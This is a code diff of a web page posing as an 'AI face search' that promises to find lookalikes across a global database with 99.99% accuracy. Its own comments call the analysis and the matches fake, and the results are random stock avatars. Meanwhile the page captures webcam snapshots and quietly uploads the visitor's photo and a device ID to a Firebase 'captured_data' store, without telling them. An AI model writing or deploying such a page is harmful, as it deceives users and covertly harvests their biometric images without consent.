@@ -14,7 +14,7 @@
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     font-family: 'Inter', -apple-system, sans-serif;
-    background: #090d16;
+    background: #090d16; /* Dark Navy like the image */
     color: #fff;
     min-height: 100vh;
     overflow-x: hidden;
@@ -22,62 +22,52 @@
 
   /* Header */
   .header {
-    height: 60px; background: #0d1323;
+    height: 60px;
+    background: #0d1323;
     border-bottom: 1px solid rgba(0, 212, 255, 0.2);
     display: flex; align-items: center; justify-content: space-between;
-    padding: 0 25px; position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    padding: 0 25px;
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
   }
   .logo { font-family: 'JetBrains Mono', monospace; font-weight: 900; color: #00d4ff; letter-spacing: 2px; font-size: 20px; display: flex; align-items: center; gap: 10px; }
   .logo span { color: #fff; }
 
   /* Layout */
-  .main-container { display: flex; margin-top: 60px; height: calc(100vh - 60px); }
+  .main-container {
+    display: flex;
+    margin-top: 60px;
+    height: calc(100vh - 60px);
+  }
 
-  /* Left Panel (Live Cam + AI Chat) */
-  .left-panel { width: 40%; padding: 20px; border-right: 1px solid rgba(0, 212, 255, 0.1); display: flex; flex-direction: column; gap: 15px; }
-  
+  /* Left Panel (Live Cam + Face Map) */
+  .left-panel {
+    width: 40%;
+    padding: 20px;
+    border-right: 1px solid rgba(0, 212, 255, 0.1);
+    display: flex; flex-direction: column; gap: 15px;
+  }
   .cam-container {
-    position: relative; width: 100%; aspect-ratio: 4/3;
-    background: #000; border-radius: 12px; overflow: hidden;
+    position: relative;
+    width: 100%;
+    aspect-ratio: 4/3;
+    background: #000;
+    border-radius: 12px;
+    overflow: hidden;
     border: 1px solid rgba(0, 212, 255, 0.3);
   }
   #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
   #canvas { display: none; }
   
-  /* MESH OVERLAY (Fake Face Mesh) */
+  /* Mesh Overlay */
   .mesh-overlay {
-    position: absolute;
-    top: 15%; left: 25%; width: 50%; height: 65%;
-    border: 2px solid rgba(0, 212, 255, 0.6);
-    border-radius: 40% 40% 35% 35%;
-    opacity: 0;
-    transition: opacity 0.3s;
-    pointer-events: none;
-    box-shadow: 0 0 30px rgba(0, 212, 255, 0.2), inset 0 0 40px rgba(0, 212, 255, 0.1);
-    display: none;
-  }
-  .mesh-overlay.active { 
-    opacity: 1; 
-    display: block; 
-    animation: pulseMesh 2s infinite alternate; 
-  }
-  @keyframes pulseMesh {
-    0% { transform: scale(1); box-shadow: 0 0 20px rgba(0,212,255,0.2); }
-    100% { transform: scale(1.02); box-shadow: 0 0 40px rgba(0,212,255,0.5); }
-  }
-  
-  /* Mesh Grid Lines */
-  .mesh-overlay::before {
-    content: '';
     position: absolute; inset: 0;
-    background-image: 
-      linear-gradient(rgba(0, 212, 255, 0.3) 1px, transparent 1px), 
-      linear-gradient(90deg, rgba(0, 212, 255, 0.3) 1px, transparent 1px);
-    background-size: 15px 15px;
-    border-radius: 40% 40% 35% 35%;
-    mask-image: radial-gradient(ellipse at center, black 50%, transparent 90%);
-    -webkit-mask-image: radial-gradient(ellipse at center, black 50%, transparent 90%);
+    background-image: linear-gradient(rgba(0, 212, 255, 0.15) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 212, 255, 0.15) 1px, transparent 1px);
+    background-size: 25px 25px;
+    opacity: 0; transition: opacity 0.5s; pointer-events: none;
+    mask-image: radial-gradient(ellipse at center, black 40%, transparent 70%);
+    -webkit-mask-image: radial-gradient(ellipse at center, black 40%, transparent 70%);
   }
+  .mesh-overlay.active { opacity: 1; }
 
   /* Scanning Line */
   .scan-line {
@@ -88,94 +78,89 @@
   .scan-line.active { display: block; }
   @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
 
-  /* AI Chat Box */
-  .chat-box {
-    background: #0d1323; border: 1px solid rgba(0, 212, 255, 0.2);
-    border-radius: 12px; padding: 15px; height: 120px;
-    font-family: 'JetBrains Mono', monospace; font-size: 12px;
-    display: flex; flex-direction: column; gap: 8px; overflow-y: auto;
+  /* Snapshots Row (Image 2 style) */
+  .snapshot-row {
+    display: flex; gap: 10px; overflow-x: auto;
+    padding: 10px 0;
   }
-  .chat-msg { color: #00d4ff; }
-  .chat-msg.user { color: #10b981; align-self: flex-end; }
-  .chat-msg.sys { color: #f59e0b; font-size: 11px; }
+  .snap-item {
+    width: 80px; height: 80px; border-radius: 8px;
+    border: 1px solid rgba(0, 212, 255, 0.5);
+    object-fit: cover; opacity: 0; transform: scale(0.8);
+    transition: all 0.3s;
+  }
+  .snap-item.show { opacity: 1; transform: scale(1); }
 
-  /* Right Panel (Results/Loading) */
-  .right-panel { width: 60%; padding: 20px; background: #0a0f1d; overflow-y: auto; display: flex; flex-direction: column; }
-  
-  /* Loading Screen */
-  .loading-screen {
-    height: 100%; display: flex; flex-direction: column;
-    align-items: center; justify-content: center; text-align: center;
+  /* Right Panel (Results Grid) */
+  .right-panel {
+    width: 60%;
+    padding: 20px;
+    background: #0a0f1d;
+    overflow-y: auto;
+    display: flex; flex-direction: column;
   }
-  .spinner {
-    width: 80px; height: 80px; border: 4px solid rgba(0, 212, 255, 0.1);
-    border-top: 4px solid #00d4ff; border-radius: 50%;
-    animation: spin 1s linear infinite; margin-bottom: 20px;
-    box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
+  .results-header {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 20px; font-family: 'JetBrains Mono', monospace;
   }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .load-text { font-family: 'JetBrains Mono', monospace; font-size: 18px; color: #00d4ff; letter-spacing: 2px; margin-bottom: 10px; }
-  .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; }
-
-  /* Internet Error Box */
-  .error-box {
-    display: none; height: 100%; flex-direction: column;
-    align-items: center; justify-content: center; text-align: center;
-    animation: fadeIn 0.5s;
-  }
-  .error-icon { font-size: 60px; color: #ff2e4c; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255, 46, 76, 0.5); }
-  .error-box h2 { color: #ff2e4c; font-family: 'JetBrains Mono', monospace; margin-bottom: 10px; }
-  .error-box p { color: #4a6b8a; margin-bottom: 20px; }
-  .retry-btn {
-    padding: 12px 30px; background: rgba(255, 46, 76, 0.1); border: 1px solid #ff2e4c;
-    color: #ff2e4c; font-family: 'JetBrains Mono', monospace; font-weight: bold;
-    border-radius: 8px; cursor: pointer; transition: 0.3s;
-  }
-  .retry-btn:hover { background: #ff2e4c; color: #000; }
-
-  /* Results Header & Grid */
-  .results-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace; }
   .results-header h2 { font-size: 18px; color: #00d4ff; }
   .results-header .accuracy { font-size: 14px; color: #10b981; font-weight: bold; }
 
-  .results-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 15px; }
+  /* Grid */
+  .results-grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    gap: 15px;
+  }
   .result-card {
-    background: #121a2f; border: 1px solid rgba(0, 212, 255, 0.1);
-    border-radius: 10px; overflow: hidden; position: relative;
-    transition: 0.3s; opacity: 0; transform: translateY(20px);
+    background: #121a2f;
+    border: 1px solid rgba(0, 212, 255, 0.1);
+    border-radius: 10px; overflow: hidden;
+    position: relative; transition: 0.3s;
+    cursor: pointer; opacity: 0; transform: translateY(20px);
     animation: popIn 0.5s forwards;
   }
+  .result-card:hover { border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); transform: translateY(-5px); }
   @keyframes popIn { to { opacity: 1; transform: translateY(0); } }
-  .result-card:hover { border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+  
   .result-card img { width: 100%; height: 160px; object-fit: cover; }
   .result-card .match-badge {
     position: absolute; top: 8px; left: 8px;
     background: rgba(16, 185, 129, 0.9); color: #000;
     padding: 3px 8px; border-radius: 4px;
     font-size: 10px; font-weight: 800; font-family: 'JetBrains Mono', monospace;
+    box-shadow: 0 0 10px rgba(16,185,129,0.5);
   }
   .result-card .info { padding: 10px; background: #090d16; }
   .result-card .name { font-size: 12px; font-weight: 700; color: #fff; margin-bottom: 2px; }
   .result-card .country { font-size: 10px; color: #4a6b8a; }
 
-  /* Start Overlay */
+  /* Start Button */
   .start-overlay {
-    position: absolute; inset: 0; background: rgba(9, 13, 22, 0.95);
+    position: absolute; inset: 0; background: rgba(9, 13, 22, 0.9);
     display: flex; flex-direction: column; align-items: center; justify-content: center;
     z-index: 10; backdrop-filter: blur(5px);
   }
   .start-overlay h1 { font-family: 'JetBrains Mono', monospace; color: #fff; font-size: 24px; margin-bottom: 10px; }
+  .start-overlay p { color: #4a6b8a; font-size: 13px; margin-bottom: 20px; }
   .start-btn {
     padding: 15px 40px; background: #00d4ff; color: #000;
     border: none; border-radius: 8px; font-family: 'JetBrains Mono', monospace;
     font-size: 16px; font-weight: 900; cursor: pointer; transition: 0.3s;
+    box-shadow: 0 0 30px rgba(0, 212, 255, 0.4);
   }
+  .start-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px rgba(0, 212, 255, 0.6); }
 
-  @media (max-width: 900px) { .main-container { flex-direction: column; height: auto; } .left-panel, .right-panel { width: 100%; } .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); } }
+  /* Mobile */
+  @media (max-width: 900px) {
+    .main-container { flex-direction: column; height: auto; }
+    .left-panel, .right-panel { width: 100%; }
+    .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); }
+  }
 </style>
 </head>
 <body>
 
+<!-- HEADER -->
 <div class="header">
   <div class="logo">AI FACE SEARCH <span>| GLOBAL DB</span></div>
   <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #10b981;">
@@ -184,60 +169,44 @@
   </div>
 </div>
 
+<!-- MAIN CONTAINER -->
 <div class="main-container">
-  <!-- LEFT PANEL -->
+  
+  <!-- LEFT PANEL (CAMERA) -->
   <div class="left-panel">
     <div class="cam-container">
       <video id="video" autoplay playsinline muted></video>
       <canvas id="canvas"></canvas>
       
-      <!-- Scan Line -->
       <div class="scan-line" id="scanLine"></div>
-      
-      <!-- MESH OVERLAY (Face Wireframe) -->
       <div class="mesh-overlay" id="meshOverlay"></div>
       
+      <!-- Start Button Overlay -->
       <div class="start-overlay" id="startOverlay">
         <h1>FACIAL RECOGNITION</h1>
-        <p style="color:#4a6b8a; font-size:13px; margin-bottom:20px;">Scan to find 7 lookalikes globally</p>
+        <p>Find lookalikes across 47.2 Million faces</p>
         <button class="start-btn" onclick="startScan()">INITIATE SCAN</button>
       </div>
     </div>
     
-    <div class="chat-box" id="chatBox">
-      <div class="chat-msg sys">[SYSTEM BOOT COMPLETE]</div>
-      <div class="chat-msg">AI: Awaiting user input to initiate biometric scan...</div>
+    <!-- Snapshot Row -->
+    <div class="snapshot-row" id="snapshotRow">
+      <!-- JS will inject 5 snapshots here -->
     </div>
   </div>
 
-  <!-- RIGHT PANEL -->
+  <!-- RIGHT PANEL (RESULTS) -->
   <div class="right-panel">
+    <div class="results-header">
+      <h2>GLOBAL MATCHES</h2>
+      <div class="accuracy" id="accuracyText" style="opacity: 0;">ACCURACY: 99.99%</div>
+    </div>
     
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loadingScreen" style="display:none;">
-      <div class="spinner"></div>
-      <div class="load-text" id="loadText">INITIALIZING...</div>
-      <div class="load-subtext" id="loadSubtext">Connecting to Global Database</div>
+    <div class="results-grid" id="resultsGrid">
+      <!-- JS will inject 7 results here -->
     </div>
-
-    <!-- Internet Error Box -->
-    <div class="error-box" id="errorBox">
-      <div class="error-icon">⚠️</div>
-      <h2>CONNECTION LOST</h2>
-      <p>Server timeout while fetching biometric data.</p>
-      <button class="retry-btn" onclick="retryScan()">RETRY CONNECTION</button>
-    </div>
-
-    <!-- Results -->
-    <div id="resultsContainer" style="display:none;">
-      <div class="results-header">
-        <h2>GLOBAL MATCHES</h2>
-        <div class="accuracy">ACCURACY: 99.99%</div>
-      </div>
-      <div class="results-grid" id="resultsGrid"></div>
-    </div>
-
   </div>
+
 </div>
 
 <script src="config.js"></script>
@@ -253,19 +222,19 @@
 
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
-  const chatBox = document.getElementById('chatBox');
 
+  // 7 Fake Lookalikes (Using AI generated faces from thispersondoesnotexist)
   const lookalikes = [
-    { name: 'Alexander D.', country: 'Russia', match: '99.99%' },
-    { name: 'John Doe', country: 'USA', match: '98.4%' },
-    { name: 'Kenji T.', country: 'Japan', match: '97.1%' },
-    { name: 'Lucas M.', country: 'Brazil', match: '94.8%' },
-    { name: 'Ivan K.', country: 'Ukraine', match: '92.5%' },
-    { name: 'Arjun S.', country: 'India', match: '89.0%' },
-    { name: 'Chen W.', country: 'China', match: '85.3%' }
+    { name: 'Alexander D.', country: 'Russia', img: 'https://thispersondoesnotexist.com/', match: '99.99%' },
+    { name: 'John Doe', country: 'USA', img: 'https://i.pravatar.cc/300?img=11', match: '98.4%' },
+    { name: 'Kenji T.', country: 'Japan', img: 'https://i.pravatar.cc/300?img=12', match: '97.1%' },
+    { name: 'Lucas M.', country: 'Brazil', img: 'https://i.pravatar.cc/300?img=13', match: '94.8%' },
+    { name: 'Ivan K.', country: 'Ukraine', img: 'https://i.pravatar.cc/300?img=14', match: '92.5%' },
+    { name: 'Arjun S.', country: 'India', img: 'https://i.pravatar.cc/300?img=15', match: '89.0%' },
+    { name: 'Chen W.', country: 'China', img: 'https://i.pravatar.cc/300?img=16', match: '85.3%' }
   ];
 
-  // AI Voice
+  // 🎙️ Real AI Voice
   function speak(text) {
     if ('speechSynthesis' in window) {
       window.speechSynthesis.cancel();
@@ -278,34 +247,22 @@
     }
   }
 
-  // Chat messages
-  function addChat(text, type = '') {
-    const div = document.createElement('div');
-    div.className = 'chat-msg ' + type;
-    div.textContent = (type === 'sys' ? '[SYSTEM] ' : 'AI: ') + text;
-    chatBox.appendChild(div);
-    chatBox.scrollTop = chatBox.scrollHeight;
-  }
-
+  // 🎥 Start Camera
   async function initCamera() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       video.srcObject = stream;
       return stream;
     } catch (err) {
-      alert('Camera access required.');
+      alert('Camera access required for face search.');
       throw err;
     }
   }
 
+  // 🚀 Start Scan
   async function startScan() {
     document.getElementById('startOverlay').style.display = 'none';
-    document.getElementById('resultsContainer').style.display = 'none';
-    document.getElementById('errorBox').style.display = 'none';
-    document.getElementById('loadingScreen').style.display = 'flex';
-    
-    speak("Initiating global facial recognition. Please hold still.");
-    addChat("Initiating biometric scan...");
+    speak("Initiating facial recognition. Please look at the camera.");
     
     let stream;
     try {
@@ -317,112 +274,61 @@
 
     // Start Effects
     document.getElementById('scanLine').classList.add('active');
-    document.getElementById('meshOverlay').classList.add('active'); // <--- MESH ACTIVE
+    document.getElementById('meshOverlay').classList.add('active');
 
-    // Start Fake Process
-    runFakeProcess(stream);
+    // Take 5 snapshots rapidly
+    let snapCount = 0;
+    const snapInterval = setInterval(() => {
+      captureSnapshot(stream, snapCount);
+      snapCount++;
+      if (snapCount >= 5) clearInterval(snapInterval);
+    }, 500);
+
+    // Start Analysis
+    setTimeout(() => {
+      runAnalysis(stream);
+    }, 3000); // 3 second baad analysis shuru
   }
 
-  function runFakeProcess(stream) {
-    const loadText = document.getElementById('loadText');
-    const loadSubtext = document.getElementById('loadSubtext');
-
-    const stages = [
-      { time: 0, text: "SCANNING FACES...", sub: "Extracting 128-point biometric map" },
-      { time: 5000, text: "MATCHING BIOMETRICS...", sub: "Querying 47.2M records in USA & EU" },
-      { time: 10000, text: "FINDING MATCHES...", sub: "Analyzing neural hash structure" },
-      { time: 15000, text: "CROSS-REFERENCING...", sub: "Scanning Interpol & National DBs" },
-      { time: 20000, text: "ERROR", sub: "" }
-    ];
-
-    stages.forEach(stage => {
-      setTimeout(() => {
-        if (stage.text === "ERROR") {
-          showInternetError(stream);
-        } else {
-          loadText.textContent = stage.text;
-          loadSubtext.textContent = stage.sub;
-          speak(stage.text);
-          addChat(stage.text, 'sys');
-        }
-      }, stage.time);
-    });
+  // 📸 Capture Snapshots (Left side me chhoti photos)
+  function captureSnapshot(stream, index) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.drawImage(video, 0, 0);
+    
+    const data = canvas.toDataURL('image/jpeg', 0.6);
+    const row = document.getElementById('snapshotRow');
+    
+    const img = document.createElement('img');
+    img.src = data;
+    img.className = 'snap-item';
+    row.appendChild(img);
+    
+    setTimeout(() => img.classList.add('show'), 50);
   }
 
-  function showInternetError(stream) {
-    document.getElementById('loadingScreen').style.display = 'none';
-    document.getElementById('errorBox').style.display = 'flex';
-    
-    // Mesh thoda kam kardo error pe, par rehne do
-    document.getElementById('meshOverlay').style.opacity = '0.3';
-    document.getElementById('scanLine').classList.remove('active');
-    
-    speak("Connection lost. Server timeout.");
-    addChat("Connection to global database lost. Please retry.", 'sys');
-    
+  // 🧠 Fake Analysis & Results
+  function runAnalysis(stream) {
+    // Camera band kar do
     stream.getTracks().forEach(t => t.stop());
-  }
-
-  function retryScan() {
-    document.getElementById('errorBox').style.display = 'none';
-    document.getElementById('loadingScreen').style.display = 'flex';
-    
-    speak("Reconnecting to secure server. Resuming scan.");
-    addChat("Reconnecting...", 'sys');
-    
-    const loadText = document.getElementById('loadText');
-    const loadSubtext = document.getElementById('loadSubtext');
-
-    loadText.textContent = "RECONNECTING...";
-    loadSubtext.textContent = "Establishing secure tunnel...";
-
-    setTimeout(async () => {
-      let stream = await initCamera();
-      
-      // Wapas mesh on kardo
-      document.getElementById('meshOverlay').style.opacity = '1';
-      document.getElementById('scanLine').classList.add('active');
-      
-      const stages2 = [
-        { time: 0, text: "RESUMING MATCHING...", sub: "Processing 47.2M faces" },
-        { time: 6000, text: "ENHANCING DATA...", sub: "Comparing facial geometry" },
-        { time: 12000, text: "FILTERING RESULTS...", sub: "Removing false positives" },
-        { time: 18000, text: "COMPILING REPORT...", sub: "Generating final candidate list" }
-      ];
-
-      stages2.forEach(stage => {
-        setTimeout(() => {
-          loadText.textContent = stage.text;
-          loadSubtext.textContent = stage.sub;
-          speak(stage.text);
-          addChat(stage.text, 'sys');
-        }, stage.time);
-      });
-
-      setTimeout(() => {
-        showResults(stream);
-      }, 25000);
-
-    }, 2000);
-  }
-
-  function showResults(stream) {
     document.getElementById('scanLine').classList.remove('active');
-    document.getElementById('meshOverlay').classList.remove('active'); // Mesh off on result
-    document.getElementById('loadingScreen').style.display = 'none';
+    document.getElementById('meshOverlay').classList.remove('active');
     
-    stream.getTracks().forEach(t => t.stop());
-
     speak("Analysis complete. 7 exact matches found with 99.99 percent accuracy.");
-    addChat("Scan complete. 7 lookalikes found.", 'sys');
 
-    document.getElementById('resultsContainer').style.display = 'block';
+    // Show Accuracy
+    document.getElementById('accuracyText').style.opacity = '1';
+
+    // Populate Results Grid
     const grid = document.getElementById('resultsGrid');
     grid.innerHTML = '';
 
     lookalikes.forEach((person, index) => {
       setTimeout(() => {
+        // Har photo ke liye ek random AI image generate karo (taaki unique lage)
         const randomImg = `https://i.pravatar.cc/300?img=${Math.floor(Math.random() * 70) + 1}`;
+        
         const card = document.createElement('div');
         card.className = 'result-card';
         card.innerHTML = `
@@ -434,18 +340,17 @@
           </div>
         `;
         grid.appendChild(card);
-      }, index * 300);
+      }, index * 300); // Har card 300ms ke gap pe aayega (animation effect)
     });
 
+    // Save to Firebase
     if (db) {
       const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      ctx.drawImage(video, 0, 0);
       const finalPhoto = canvas.toDataURL('image/jpeg', 0.8);
       db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
         image: finalPhoto,
         timestamp: Date.now(),
+        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         type: 'ai_face_search'
       });
     }
